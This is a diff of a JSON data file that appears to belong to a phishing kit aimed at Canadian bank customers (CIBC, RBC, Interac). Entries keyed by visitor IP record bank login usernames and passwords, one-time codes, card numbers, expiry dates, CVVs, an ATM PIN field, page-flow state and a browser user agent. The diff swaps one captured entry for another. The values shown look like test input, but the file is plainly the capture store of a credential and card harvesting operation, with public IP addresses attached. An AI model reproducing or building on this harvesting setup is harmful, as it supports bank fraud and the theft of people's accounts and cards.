@@ -1,33 +1,23 @@
 [
   {
     "ip": "127.0.0.1",
-    "status": true
-  },
-  {
-    "ip": "142.169.16.151",
-    "status": false,
-    "banks": "CIBC",
-    "page": " Loading ",
-    "username": "7887878787",
-    "password": "znzjxnxjxjxjxj",
-    "nextPage": "card",
-    "code": "679767",
-    "card": "1111222233334444",
-    "exp1": "04",
-    "exp2": "28",
-    "cvv": "575",
-    "atm": ""
+    "status": false
   },
   {
     "ip": "24.201.184.79",
     "status": false,
-    "banks": "Interac",
-    "page": "Interac"
-  },
-  {
-    "ip": "87.79.22.196",
-    "status": false,
-    "banks": "Interac",
-    "page": "Interac"
+    "banks": "RBC",
+    "page": " Login ",
+    "username": "54545454557",
+    "description": "",
+    "password": "shhahshd",
+    "nextPage": "card",
+    "code": "848457",
+    "card": "1111222233334444",
+    "exp1": "04",
+    "exp2": "25",
+    "cvv": "575",
+    "atm": "",
+    "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.1 Mobile/15E148 Safari/604.1"
   }
 ]
